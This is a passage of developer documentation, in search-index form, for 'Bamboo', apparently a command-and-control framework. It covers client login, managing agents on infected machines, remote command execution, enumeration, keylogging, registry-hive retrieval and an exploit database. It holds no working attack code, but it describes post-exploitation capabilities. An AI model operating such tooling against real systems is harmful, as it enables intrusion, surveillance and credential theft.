<p></p>"},{"location":"Client/misc_func.html#arguments","title":"arguments","text":""},{"location":"Client/misc_func.html#description","title":"Description","text":"<p>Mainly for the CLI, this function allows user to connect to Bamboo Teamserver using a different IP Address and/or ports from the default. With this function, users can add arguments when running.</p> <pre><code>python handler_cli.py -ip 192.168.39.7 -p 1122\npython handler_cli.py --host 32.222.104.31 --port 9999\n</code></pre>"},{"location":"Client/misc_func.html#function-argument","title":"Function Argument","text":"<p>This function does not require any arguments</p> <p></p>"},{"location":"Client/misc_func.html#check_agent_status","title":"check_agent_status","text":""},{"location":"Client/misc_func.html#description_1","title":"Description","text":"<p>This function acts as a 'middleman' that when called, it will call the <code>auth.check_agent_status</code> command to check for the specified Bamboo Agent status. It is used in commands that requires the Bamboo Agent to be 'alive', which includes <code>exp</code>, <code>cmd</code>, and <code>postexp [method]</code>.</p>"},{"location":"Client/misc_func.html#function-argument_1","title":"Function Argument","text":"Field Type Description username String Username of Bamboo Client agent_identifier String Bamboo Agent to query status server_ip String IP Address of Bamboo Teamserver jwt_token String JWT"},{"location":"Client/misc_func.html#argument-example","title":"Argument Example","text":"<pre><code>check_agent_status(\"bambooUser\", \"5zrire9a\", \"127.0.0.1\", jwt_token)\n</code></pre>"},{"location":"Client/misc_func.html#login-gui_login","title":"login &amp; gui_login","text":""},{"location":"Client/misc_func.html#description_2","title":"Description","text":"<p>Both functions is used to login Bamboo Client users, but <code>login</code> is for CLI while <code>gui_login</code> is for GUI. The difference being <code>login</code> allows user input while <code>gui_login</code> does not require user input as it is in a window. Both functions calls the <code>auth.authentication</code> command.</p>"},{"location":"Client/misc_func.html#function-argument_2","title":"Function Argument","text":""},{"location":"Client/misc_func.html#login","title":"<code>login</code>","text":"Field Type Description server_ip String IP Address of Bamboo Teamserver"},{"location":"Client/misc_func.html#gui_login","title":"<code>gui_login</code>","text":"Field Type Description username String Username that user input password String Password that user input server_ip String IP Address of Bamboo Teamserver"},{"location":"Client/misc_func.html#argument-example_1","title":"Argument Example","text":""},{"location":"Client/misc_func.html#login_1","title":"<code>login</code>","text":"<pre><code>login(\"127.0.0.1\")\n</code></pre>"},{"location":"Client/misc_func.html#gui_login_1","title":"<code>gui_login</code>","text":"<pre><code>gui_login(\"bambooUser\", \"adnap\", \"127.0.0.1\")\n</code></pre>"},{"location":"Client/misc_func.html#teamchatreaderwriter","title":"TeamChatReaderWriter","text":""},{"location":"Client/misc_func.html#description_3","title":"Description","text":"<p>TeamChatReaderWriter is a class that enables the command <code>chat</code> in the CLI. This class is not needed for Bamboo Client GUI.</p>"},{"location":"Client/misc_func.html#brief-breakdown","title":"Brief Breakdown","text":"<p>Bamboo Client user will run the <code>run_chat</code> function within to start the teamchat function. The teamchat function will run another function <code>reading_teamchat</code> in another process and will have an infinite <code>while</code> loop until the user <code>exit</code>. <code>reading_teamchat</code> is a function within the class that will read the new chat messages in the file and if there are new messages using the <code>read_new_message</code> function, it will be printed out for the user in real time. Users will also be able to send messages in the teamchat function using the function <code>teamchat</code> within the class, that will send the user's message to Bamboo Teamserver that will be broadcasted to all Bamboo Clients connected.</p>"},{"location":"Client/misc_func.html#function-argument_3","title":"Function Argument","text":"Field Type Description username String Username that user input jwt_token String JWT"},{"location":"Client/misc_func.html#argument-example_2","title":"Argument Example","text":"<pre><code>run_chat(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/misc_func.html#timestamp","title":"timestamp","text":""},{"location":"Client/misc_func.html#description_4","title":"Description","text":"<p>Widely used in Bamboo Client that helps generate timestamp of command input.</p>"},{"location":"Client/misc_func.html#function-argument_4","title":"Function Argument","text":"<p>This function does not require any arguments</p> <p></p>"},{"location":"Client/misc_func.html#websock_conn-and-server_msg","title":"websock_conn and server_msg","text":"<p>These functions are the core components for WebSocket communicates between Bamboo Client and Bamboo Teamserver.</p>"},{"location":"Client/misc_func.html#description-websock_conn","title":"Description - websock_conn","text":"<p>websock_conn is called when a Bamboo Client is starting up. After the Bamboo Client log ins successfully, this function will help the Bamboo Client to connect to the Bamboo Teamserver WebSocket connection to receive real time updates.</p>"},{"location":"Client/misc_func.html#function-argument-websock_conn","title":"Function Argument - websock_conn","text":"Field Type Description username String Username that user input"},{"location":"Client/misc_func.html#argument-example-websock_conn","title":"Argument Example - websock_conn","text":"<pre><code>websock_conn(\"bambooUser\")\n</code></pre>"},{"location":"Client/misc_func.html#description-server_msg","title":"Description - server_msg","text":"<p>As another core component of the WebSocket, this function enables Bamboo Client to receive and print out the messages to Bamboo Client users in real time. There are a total of 5 message type that the Bamboo Teamserver can send.</p> Message Type Description Example serverMsg General server message When a new Bamboo Agent is registered, all Bamboo Clients will be notified in real time chatMsg For teamchat function Teamchat messages from other Bamboo Client will be received and be appended into the message file keylogMsg For command <code>postexp keylog</code> results Bamboo Client will generate a file for the keylogging results and put it in the keylog folder enumerateMsg For command <code>enum</code> results Bamboo Client will generate a file for the enumeration results and put it in the enum folder retrieveMsg For command <code>postexp retrieve</code> results Bamboo Client will generate a folder for the registry hive files and put it under the retrieve folder"},{"location":"Client/misc_func.html#function-argument_5","title":"Function Argument","text":"Field Type Description ws Object WebSocket connection message Dictionary Contains the message type and the message"},{"location":"Client/misc_func.html#argument-example_3","title":"Argument Example","text":"<pre><code>server_msg(ws,\n    {\n        \"chatMsg\": \"bambooUser: Hello\"\n    })\n</code></pre>"},{"location":"Client/misc_func.html#open_files","title":"open_files","text":""},{"location":"Client/misc_func.html#description_5","title":"Description","text":"<p>This file contains 3 functions, <code>open_keylog</code>, <code>open_enum</code>, and <code>open_retrieve</code>. These functions help enable the dropdown menu of the GUI to open the respective folder when clicked.</p>"},{"location":"Client/misc_func.html#function-argument_6","title":"Function Argument","text":"<p>This function does not require any arguments</p>"},{"location":"Client/misc_func.html#resize","title":"resize","text":""},{"location":"Client/misc_func.html#description_6","title":"Description","text":"<p>This function enables the widgets and the text within the GUI to be resized when the window size changes</p>"},{"location":"Client/misc_func.html#function-argument_7","title":"Function Argument","text":"Field Type Description app Object Tkinter Root ws_box Object Widget tabs Object Widget"},{"location":"Client/misc_func.html#argument-example_4","title":"Argument Example","text":"<pre><code>resize(app, ws_box, tabs)\n</code></pre>"},{"location":"Client/misc_func.html#start_","title":"start_*","text":""},{"location":"Client/misc_func.html#description_7","title":"Description","text":"<p><code>start_*</code> are a list of files that contains a class or a function. Each file is a crucial component of the GUI as it contains the pop up windows for certain commands and the logic for each.</p> File Class\\Function Command Description run_add start_add <code>add</code>/dropdown menu Allows Bamboo Client user to configure and add a new exploit into the database and server run_exploit start_exploit <code>exploit</code> Allows Bamboo Client user to configure exploits and sent it over to Bamboo Teamserver to proceed run_homescreen run_homescreen Null Runs the homescreen for GUI on start up run_login run_login Null Runs the connection and login window for GUI for connection and authorisation run_modify start_modify <code>modify</code>/dropdown menu Allows Bamboo Client user to modify an exploit in Bamboo Teamserver run_register register_user <code>register</code>/dropdown menu Allows Bamboo Client user to register a new set of credentials"},{"location":"Client/overview.html","title":"Overview","text":"<p>This section of the document includes information pertaining to the Bamboo Client. Note that the Client is referenced as \"the handler\" in the source code.</p> <p>Below is the file structure of the Bamboo Client.</p> <pre><code>handler\n\u251c\u2500\u2500 commands\n\u2502   \u251c\u2500\u2500 auth.py\n\u2502   \u251c\u2500\u2500 cmd.py\n\u2502   \u251c\u2500\u2500 exploit.py\n\u2502   \u2514\u2500\u2500 handler_func.py\n\u251c\u2500\u2500 func\n\u2502   \u251c\u2500\u2500 argument.py\n\u2502   \u251c\u2500\u2500 check_agent_status.py\n\u2502   \u251c\u2500\u2500 login.py\n\u2502   \u251c\u2500\u2500 teamchat.py\n\u2502   \u251c\u2500\u2500 timestamp\n\u2502   \u2514\u2500\u2500 ws.py\n\u251c\u2500\u2500 gui\n\u2502   \u251c\u2500\u2500 commands\n\u2502   \u2502   \u251c\u2500\u2500 agent.py\n\u2502   \u2502   \u251c\u2500\u2500 exploit.py\n\u2502   \u2502   \u251c\u2500\u2500 general.py\n\u2502   \u2502   \u251c\u2500\u2500 postexp.py\n\u2502   \u2502   \u2514\u2500\u2500 user.py\n\u2502   \u251c\u2500\u2500 func\n\u2502   \u2502   \u251c\u2500\u2500 add_tab.py\n\u2502   \u2502   \u251c\u2500\u2500 open_files.py\n\u2502   \u2502   \u251c\u2500\u2500 resize.py\n\u2502   \u2502   \u251c\u2500\u2500 run_add.py\n\u2502   \u2502   \u251c\u2500\u2500 run_exploit.py\n\u2502   \u2502   \u251c\u2500\u2500 run_homescreen.py\n\u2502   \u2502   \u251c\u2500\u2500 run_login.py\n\u2502   \u2502   \u251c\u2500\u2500 run_modify.py\n\u2502   \u2502   \u2514\u2500\u2500 run_register.py\n\u2502   \u251c\u2500\u2500 img\n\u2502   \u2502   \u251c\u2500\u2500 app_icon.ico\n\u2502   \u2502   \u251c\u2500\u2500 app_icon.png\n\u2502   \u2502   \u251c\u2500\u2500 bamboo_home.png\n\u2502   \u2502   \u251c\u2500\u2500 bamboo_home2.png\n\u2502   \u2502   \u251c\u2500\u2500 bamboo_icon.png\n\u2502   \u2502   \u251c\u2500\u2500 bamboo_icon2.png\n\u2502   \u2502   \u2514\u2500\u2500 bamboo_logo.png\n\u2502   \u251c\u2500\u2500 widgets\n\u2502   \u2502   \u251c\u2500\u2500 center_window.py\n\u2502   \u2502   \u251c\u2500\u2500 console.py\n\u2502   \u2502   \u251c\u2500\u2500 displayFrame.py\n\u2502   \u2502   \u251c\u2500\u2500 menu.py\n\u2502   \u2502   \u251c\u2500\u2500 tabs.py\n\u2502   \u2502   \u251c\u2500\u2500 teamchat.py\n\u2502   \u2502   \u2514\u2500\u2500 ws_textBox.py\n\u2502   \u2514\u2500\u2500 info.txt\n\u251c\u2500\u2500 postexp\n\u2502   \u251c\u2500\u2500 enumerate\n\u2502   \u251c\u2500\u2500 keylog\n\u2502   \u2514\u2500\u2500 retrieve\n\u251c\u2500\u2500 global_vars.py\n\u251c\u2500\u2500 handler_cli.py\n\u251c\u2500\u2500 handler_gui.py\n\u251c\u2500\u2500 homescreen.py\n\u251c\u2500\u2500 login.py\n\u2514\u2500\u2500 teamchat.txt\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html","title":"<code>auth</code>","text":"<p>The auth class provides methods to interact with a server for user authentication and agent status management. It facilitates operations such as checking server availability, user login, user logout, and checking the status of agents. Each method in the class is designed to communicate with specific endpoints of the server API, handling tasks related to user authentication and session management.</p>"},{"location":"Client/Command_Classes/command_auth.html#check","title":"check","text":"<p>Determines if the server is online</p>"},{"location":"Client/Command_Classes/command_auth.html#endpoint","title":"Endpoint","text":"<pre><code>GET /auth/\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#function-argument","title":"Function argument","text":"<p>This function does not require any argument</p>"},{"location":"Client/Command_Classes/command_auth.html#description","title":"Description","text":"<p>This function attempts to connect to the server by sending a GET request to the <code>/auth/</code> endpoint. If the connection is successful, it returns \"success.\" If the server cannot be reached, it prints an error message and returns \"failed.\"</p>"},{"location":"Client/Command_Classes/command_auth.html#_1","title":"auth","text":""},{"location":"Client/Command_Classes/command_auth.html#function-return","title":"Function return","text":"Field Type Description Status String Indicates whether the connection to the server was successful."},{"location":"Client/Command_Classes/command_auth.html#authentication","title":"authentication","text":"<p>Authenticates the user</p>"},{"location":"Client/Command_Classes/command_auth.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /auth/login\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#description_1","title":"Description","text":"<p>This function sends a POST request to the <code>/auth/login</code> endpoint with the provided username and password. If the credentials are correct, the server returns a JSON response containing the login status and a JWT token. The function returns the login status and the JWT token if available.</p>"},{"location":"Client/Command_Classes/command_auth.html#function-argument_1","title":"Function argument","text":"Field Type Description username String Username of user password String Password of user"},{"location":"Client/Command_Classes/command_auth.html#arguments-example","title":"Arguments Example","text":"<pre><code>authentication(\"bambooUser\", \"adnap\")\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#function-return_1","title":"Function return","text":"Field Type Description Status String Status of login jwt_token String JWT token for authentication"},{"location":"Client/Command_Classes/command_auth.html#logout","title":"logout","text":"<p>Logs out the user</p>"},{"location":"Client/Command_Classes/command_auth.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /auth/logout\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#description_2","title":"Description","text":"<p>This function sends a POST request to the <code>/auth/logout</code> endpoint with the provided username. If the server responds with a status code of 200, it prints a message indicating that the user has exited the server.</p>"},{"location":"Client/Command_Classes/command_auth.html#function-argument_2","title":"Function argument","text":"Field Type Description username String Username of user jwt_token String JWT token for authentication"},{"location":"Client/Command_Classes/command_auth.html#arguments-example_1","title":"Arguments Example","text":"<pre><code>logout(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#function-return_2","title":"Function Return","text":"<p>The function does not return anything</p>"},{"location":"Client/Command_Classes/command_auth.html#check_agent_status","title":"check_agent_status","text":"<p>Checks the status of an agent.</p>"},{"location":"Client/Command_Classes/command_auth.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /auth/check_agent_status\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#description_3","title":"Description","text":"<p>This function sends a POST request to the <code>/auth/check_agent_status</code> endpoint with the provided username and agent identifier. The server responds with the status of the agent, which is returned as a JSON object.</p>"},{"location":"Client/Command_Classes/command_auth.html#function-argument_3","title":"Function argument","text":"Field Type Description username String Username of user agent_identifier String Identifier for the agent jwt_token String JWT token for authentication"},{"location":"Client/Command_Classes/command_auth.html#arguments-example_2","title":"Arguments Example","text":"<pre><code>check_agent_status(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_auth.html#function-return_3","title":"Function return","text":"Field Type Description response String Status of Agent"},{"location":"Client/Command_Classes/command_cmd.html","title":"<code>commands</code>","text":"<p>The commands class provides methods for interacting with an agent through various server endpoints. This includes processes like exploiting an agent, sending commands, enumerating system information, and performing post-exploitation activities.</p>"},{"location":"Client/Command_Classes/command_cmd.html#exploit_process","title":"exploit_process","text":"<p>Starts an exploit process on the specified agent.</p>"},{"location":"Client/Command_Classes/command_cmd.html#endpoint","title":"Endpoint","text":"<pre><code>POST /exploit/quit\nPOST /exploit/view_all\nPOST /exploit/send_config\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#description","title":"Description","text":"<p>This function first retrieves all available exploits from the Bamboo Teamserver using the <code>/exploit/view_all</code> endpoint. The user will select an exploit, and start start configuring it. This function is dynamic in a way that only shows what can be chosen to the user. As different exploits have different configurations, each exploit configuration steps may be different. If during the configuration, the user wants to stop the process, the <code>/exploit/quit</code> endpoint will be called for logging purposes. The <code>/exploit/send_config</code> endpoint will be called to proceed once the user confirms the exploitation.</p>"},{"location":"Client/Command_Classes/command_cmd.html#function-argument","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_cmd.html#arguments-example","title":"Arguments Example","text":"<pre><code>exploit_process(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#function-return","title":"Function Return","text":"Field Type Description Status String Status of the exploit process initiation"},{"location":"Client/Command_Classes/command_cmd.html#command_prompt","title":"command_prompt","text":"<p>Sends a command to the agent and retrieves the output.</p>"},{"location":"Client/Command_Classes/command_cmd.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /handler_func/cmd\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#description_1","title":"Description","text":"<p>This function will send the command input by the user and then continuously checks for the response until it is received or a timeout occurs.</p>"},{"location":"Client/Command_Classes/command_cmd.html#function-argument_1","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent cmd String Command to be executed on the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_cmd.html#arguments-example_1","title":"Arguments Example","text":"<pre><code>command_prompt(\"bambooUser\", \"5zrire9a\", \"whoami\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#function-return_1","title":"Function Return","text":"Field Type Description Output String Output from the command executed on the agent"},{"location":"Client/Command_Classes/command_cmd.html#enum","title":"enum","text":"<p>Enumerates information about the infected machine.</p>"},{"location":"Client/Command_Classes/command_cmd.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /postexp/enum\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#description_2","title":"Description","text":"<p>This method requests the enumeration of an infected machine and indicates that the result is back and can be viewed.</p>"},{"location":"Client/Command_Classes/command_cmd.html#function-argument_2","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent priv_lvl String Privilege level for the enumeration jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_cmd.html#arguments-example_2","title":"Arguments Example","text":"<pre><code>enum(\"bambooUser\", \"5zrire9a\", \"High\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#function-return_2","title":"Function Return","text":"Field Type Description Status String Status of the enumeration request"},{"location":"Client/Command_Classes/command_cmd.html#postexp","title":"postexp","text":"<p>Command post exploitation tools provided</p>"},{"location":"Client/Command_Classes/command_cmd.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /postexp/{method}\n\nPOST /postexp/keylog\nPOST /postexp/retrieve\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#description_3","title":"Description","text":"<p>This function will send the command to the Bamboo Agent and depending on the method (keylog/retrieve), there will be different outputs. SSS_Retrieve can only be used if the Bamboo Agent privilege is \"High\" or \"System\"</p>"},{"location":"Client/Command_Classes/command_cmd.html#function-argument_3","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent method String Post-exploitation method to be executed priv_lvl String Privilege level for the post-exploitation jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_cmd.html#arguments-example_3","title":"Arguments Example","text":"<pre><code>postexp(\"bambooUser\", \"5zrire9a\", \"keylog\", \"Medium\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_cmd.html#function-return_3","title":"Function Return","text":"Field Type Description Status String Status of the post-exploitation action"},{"location":"Client/Command_Classes/command_exploit.html","title":"<code>exploits</code>","text":"<p>The exploits class provides method for interacting with the exploits loaded in the database through various server endpoints. This includes processes such as add an exploit, modifying an exploit, and more.</p>"},{"location":"Client/Command_Classes/command_exploit.html#view_exploits","title":"view_exploits","text":"<p>Retrieves and displays a list of all current exploits.</p>"},{"location":"Client/Command_Classes/command_exploit.html#endpoint","title":"Endpoint","text":"<pre><code>POST /exploit/view_all\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#description","title":"Description","text":"<p>This function sends a POST request to retrieve all exploits from the server and displays them in a formatted table.</p>"},{"location":"Client/Command_Classes/command_exploit.html#function-argument","title":"Function Argument","text":"Field Type Description username String Username of the user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_exploit.html#arguments-example","title":"Arguments Example","text":"<pre><code>view_exploits(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#function-return","title":"Function Return","text":"Field Type Description headers List Headers for the table table List List of exploit details for the table"},{"location":"Client/Command_Classes/command_exploit.html#add_exploit","title":"add_exploit","text":"<p>Adds a new exploit to the server.</p>"},{"location":"Client/Command_Classes/command_exploit.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /exploit/add\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#description_1","title":"Description","text":"<p>This function handles the process of adding a new exploit, including collecting file information and configurations from the user. When configuring the new exploit to add, different options will be shown depending on the previous output as the whole process is dynamic and will only query for an input if there was a choice.</p>"},{"location":"Client/Command_Classes/command_exploit.html#function-argument_1","title":"Function Argument","text":"Field Type Description username String Username of the user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_exploit.html#arguments-example_1","title":"Arguments Example","text":"<pre><code>add_exploit(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#function-return_1","title":"Function Return","text":"Field Type Description Status String Success or failure message"},{"location":"Client/Command_Classes/command_exploit.html#del_exploit","title":"del_exploit","text":"<p>Deletes an existing exploit from the server.</p>"},{"location":"Client/Command_Classes/command_exploit.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /exploit/delete\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#description_2","title":"Description","text":"<p>This function sends a request to delete an exploit based on its name.</p>"},{"location":"Client/Command_Classes/command_exploit.html#function-argument_2","title":"Function Argument","text":"Field Type Description username String Username of the user exploit_name String Name of the exploit to delete jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_exploit.html#arguments-example_2","title":"Arguments Example","text":"<pre><code>del_exploit(\"bambooUser\", \"wacom.exe\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#function-return_2","title":"Function Return","text":"Field Type Description Status String Success or failure message"},{"location":"Client/Command_Classes/command_exploit.html#modify","title":"modify","text":"<p>Modifies the details of an existing exploit.</p>"},{"location":"Client/Command_Classes/command_exploit.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /exploit/modify\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#description_3","title":"Description","text":"<p>This function allows for modification of an existing exploit. It includes options to change various details such as name, app version, LPE start, LPE end, and others. Some changes will result in other changes as well. Refer to the flowchart below to find out more.</p> <p>&lt;add exploit flowchart&gt;</p>"},{"location":"Client/Command_Classes/command_exploit.html#function-argument_3","title":"Function Argument","text":"Field Type Description username String Username of the user exploit_name String Name of the exploit to delete jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_exploit.html#arguments-example_3","title":"Arguments Example","text":"<pre><code>modify(\"bambooUser\", \"wacom.exe\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#function-return_3","title":"Function Return","text":"Field Type Description Status String Success or failure message"},{"location":"Client/Command_Classes/command_handler_func.html","title":"<code>handler_func</code>","text":"<p>The handler_func class provides methods that are handy for the user but are not related to commands, exploits, and authorization. This includes processes such as displaying all agents, displaying all users, and more.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#display","title":"display","text":"<p>Retrieves information from the database</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint","title":"Endpoint","text":"<pre><code>POST /handler_func/agent/display\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description","title":"Description","text":"<p>This function sends a POST request to retrieve agent and heartbeat status data from the server. It then formats and displays this data in a table with color-coded statuses.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument","title":"Function Argument","text":"Field Type Description username String Username of the user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example","title":"Arguments Example","text":"<pre><code>display(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return","title":"Function Return","text":"Field Type Description table List List containing headers and table data"},{"location":"Client/Command_Classes/command_handler_func.html#use_agent","title":"use_agent","text":"<p>Obtains agent information and caches it for future use.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/use_agent\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_1","title":"Description","text":"<p>This function requests agent data using its identifier and caches the data for future use. It also handles cases where the agent does not exist.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_1","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_1","title":"Arguments Example","text":"<pre><code>use_agent(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_1","title":"Function Return","text":"Field Type Description agent_data Dict Dictionary containing agent information or empty"},{"location":"Client/Command_Classes/command_handler_func.html#stop_agent","title":"stop_agent","text":"<p>Clears the cache and stops using the specified agent.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/stop_agent\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_2","title":"Description","text":"<p>This function sends a request to stop using a specified agent and clears any cached data related to that agent.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_2","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_2","title":"Arguments Example","text":"<pre><code>stop_agent(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_2","title":"Function Return","text":"Field Type Description Status String Status of the stop operation"},{"location":"Client/Command_Classes/command_handler_func.html#remove_agent","title":"remove_agent","text":"<p>Removes an agent from the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/remove_agent\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_3","title":"Description","text":"<p>This function sends a request to remove an agent from the database and handles success or failure responses. If the agent is still running, it will sent server will send a kill command to stop the agent from running.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_3","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_3","title":"Arguments Example","text":"<pre><code>remove_agent(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_3","title":"Function Return","text":"Field Type Description Status String Status of the stop operation"},{"location":"Client/Command_Classes/command_handler_func.html#info_status","title":"info_status","text":"<p>Checks the status of a specific agent.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_4","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/info_status\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_4","title":"Description","text":"<p>This function checks the status of a specified agent by sending a request to the server.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_4","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_4","title":"Arguments Example","text":"<pre><code>info_status(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_4","title":"Function Return","text":"Field Type Description Status String Status of the agent"},{"location":"Client/Command_Classes/command_handler_func.html#view_users","title":"view_users","text":"<p>Views and displays all users in the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_5","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/view_users\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_5","title":"Description","text":"<p>This function retrieves and displays user information from the database, showing their status as well.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_5","title":"Function Argument","text":"Field Type Description username String Username of the user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_5","title":"Arguments Example","text":"<pre><code>view_users(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_5","title":"Function Return","text":"Field Type Description Table List List containing headers and user data"},{"location":"Client/Command_Classes/command_handler_func.html#register_user","title":"register_user","text":"<p>Registers a new user in the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_6","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/register_user\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_6","title":"Description","text":"<p>This function sends a request to register a new user and handles responses based on the result of the registration attempt.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_6","title":"Function Argument","text":"Field Type Description username String Username of the user new_username String Username of the new user new_password String Password of the new user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_6","title":"Arguments Example","text":"<pre><code>register_user(\"bambooUser\", \"bambooUserTwo\", \"paSswORd@111\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_6","title":"Function Return","text":"Field Type Description Status String Status of the registration"},{"location":"Client/Command_Classes/command_handler_func.html#delete_user","title":"delete_user","text":"<p>Deletes a user from the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_7","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/delete_user\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_7","title":"Description","text":"<p>This function sends a request to delete a specified user from the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_7","title":"Function Argument","text":"Field Type Description username String Username of the user del_username String Username of the user to delete jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_7","title":"Arguments Example","text":"<pre><code>delete_user(\"bambooUser\", \"bambooUserTwo\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_7","title":"Function Return","text":"Field Type Description Status String Status of the deletion operation"},{"location":"Client/GUI/overview.html","title":"Overview","text":"<p>This section will provide an overview of the graphical user interface (GUI) Client that users can opt to use instead of the command line interface.</p> <p>The GUI was developed in Python 3.11, using CustomTkinter (CTk), the UI-library made by Tom Schimansky, as well as Tkinter, the standard Python interface to the Tk GUI toolkit.</p> <p>When handler_gui.py is first run, users will be greeted by the server connect &amp; login window, which is a separate CTk main loop from the main application. This is done by running login.py, where this window is initialised, in a subprocess using the subprocess module.</p> <p>Users will first be 